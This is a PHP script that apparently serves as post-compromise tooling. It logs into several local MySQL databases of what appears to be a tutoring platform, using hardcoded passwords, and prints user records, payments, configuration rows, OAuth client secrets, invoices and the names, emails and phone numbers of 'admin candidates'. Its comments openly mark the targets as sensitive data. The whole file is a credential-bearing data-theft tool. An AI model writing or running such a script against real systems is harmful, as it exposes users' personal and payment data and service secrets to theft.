<?php
error_reporting(0);

// 1. e_notifications_db_2020
echo "\n========== DATABASE: e_notifications_db_2020 ==========\n";
try {
    $pdo = new PDO("mysql:host=127.0.0.1;port=3306;dbname=e_notifications_db_2020;charset=utf8", 
        "e_notifications_db_2020", 
        'e_notifications_db_2020$$wewel343ft430iddmnms34df56u6h');
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
    $tables = $pdo->query('SHOW TABLES')->fetchAll(PDO::FETCH_COLUMN);
    echo "Tables: " . implode(', ', $tables) . "\n";
    
    foreach ($tables as $t) {
        $cnt = $pdo->query("SELECT COUNT(*) FROM `$t`")->fetchColumn();
        if ($cnt > 0) echo "  $t: $cnt rows\n";
    }
    
    if (in_array('users', $tables)) {
        $rows = $pdo->query('SELECT * FROM users LIMIT 2')->fetchAll(PDO::FETCH_ASSOC);
        foreach ($rows as $r) echo json_encode($r, JSON_UNESCAPED_UNICODE) . "\n";
    }
    if (in_array('notifications', $tables)) {
        $rows = $pdo->query('SELECT * FROM notifications LIMIT 2')->fetchAll(PDO::FETCH_ASSOC);
        foreach ($rows as $r) echo json_encode($r, JSON_UNESCAPED_UNICODE) . "\n";
    }
} catch (Exception $e) {
    echo "ERROR: " . $e->getMessage() . "\n";
}

// 2. explicadorlives
echo "\n========== DATABASE: explicadorlives ==========\n";
try {
    $pdo = new PDO("mysql:host=127.0.0.1;port=3306;dbname=explicadorlives;charset=utf8", 
        "explicadorlives", "explicadorlives");
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
    $tables = $pdo->query('SHOW TABLES')->fetchAll(PDO::FETCH_COLUMN);
    echo "Tables: " . implode(', ', $tables) . "\n";
    
    foreach ($tables as $t) {
        $cnt = $pdo->query("SELECT COUNT(*) FROM `$t`")->fetchColumn();
        if ($cnt > 0) echo "  $t: $cnt rows\n";
    }
    
    if (in_array('users', $tables)) {
        $rows = $pdo->query('SELECT * FROM users LIMIT 2')->fetchAll(PDO::FETCH_ASSOC);
        foreach ($rows as $r) echo json_encode($r, JSON_UNESCAPED_UNICODE) . "\n";
    }
} catch (Exception $e) {
    echo "ERROR: " . $e->getMessage() . "\n";
}

// 3. Get more sensitive data from explicadorPlataform54321
echo "\n========== explicadorPlataform54321 - SENSITIVE DATA ==========\n";
try {
    $pdo = new PDO("mysql:host=127.0.0.1;port=3306;dbname=explicadorPlataform54321;charset=utf8", 
        "explicadorPlataform54321", "explicadorPlataform54321");
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
    // Get payments
    echo "--- PAYMENTS (SAMPLE) ---\n";
    $rows = $pdo->query('SELECT * FROM payments ORDER BY id DESC LIMIT 3')->fetchAll(PDO::FETCH_ASSOC);
    foreach ($rows as $r) echo json_encode($r, JSON_UNESCAPED_UNICODE) . "\n";
    
    // Get configs (might have API keys)
    echo "--- CONFIGS (SENSITIVE) ---\n";
    $rows = $pdo->query('SELECT * FROM configs LIMIT 10')->fetchAll(PDO::FETCH_ASSOC);
    foreach ($rows as $r) echo json_encode($r, JSON_UNESCAPED_UNICODE) . "\n";
    
    // Get social_providers
    echo "--- SOCIAL PROVIDERS ---\n";
    $rows = $pdo->query('SELECT * FROM social_providers LIMIT 3')->fetchAll(PDO::FETCH_ASSOC);
    foreach ($rows as $r) echo json_encode($r, JSON_UNESCAPED_UNICODE) . "\n";
    
    // Get oauth_clients
    echo "--- OAUTH CLIENTS ---\n";
    $rows = $pdo->query('SELECT * FROM oauth_clients')->fetchAll(PDO::FETCH_ASSOC);
    foreach ($rows as $r) echo json_encode($r, JSON_UNESCAPED_UNICODE) . "\n";
    
    // User count by type
    echo "--- USER STATS ---\n";
    $cnt = $pdo->query('SELECT COUNT(*) FROM users')->fetchColumn();
    echo "Total users: $cnt\n";
    $admins = $pdo->query("SELECT id,name,email,telefone FROM users WHERE is_other='1' OR name LIKE '%admin%' OR email LIKE '%admin%' LIMIT 5")->fetchAll(PDO::FETCH_ASSOC);
    foreach ($admins as $r) echo "Admin candidate: " . json_encode($r) . "\n";
    
} catch (Exception $e) {
    echo "ERROR: " . $e->getMessage() . "\n";
}

// 4. Invoice DB - check for sensitive invoice data
echo "\n========== invoice_explicador_2021 - INVOICE DATA ==========\n";
try {
    $pdo = new PDO("mysql:host=127.0.0.1;port=3306;dbname=invoice_explicador_2021_skddj34nbdu98udfd;charset=utf8", 
        "invoice_explic4nbdu98udfd", "invoice_explicador_2021_skddj34nbdu98udfd");
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
    // Get invoice samples
    echo "--- WATERY INVOICES (SAMPLE) ---\n";
    $cnt = $pdo->query('SELECT COUNT(*) FROM watery_invoices')->fetchColumn();
    echo "Total invoices: $cnt\n";
    $rows = $pdo->query('SELECT * FROM watery_invoices LIMIT 2')->fetchAll(PDO::FETCH_ASSOC);
    foreach ($rows as $r) echo json_encode($r, JSON_UNESCAPED_UNICODE) . "\n";
    
    // Get oauth_clients
    echo "--- OAUTH CLIENTS ---\n";
    $rows = $pdo->query('SELECT id,name,secret,redirect FROM oauth_clients')->fetchAll(PDO::FETCH_ASSOC);
    foreach ($rows as $r) echo json_encode($r) . "\n";
    
} catch (Exception $e) {
    echo "ERROR: " . $e->getMessage() . "\n";
}
?>
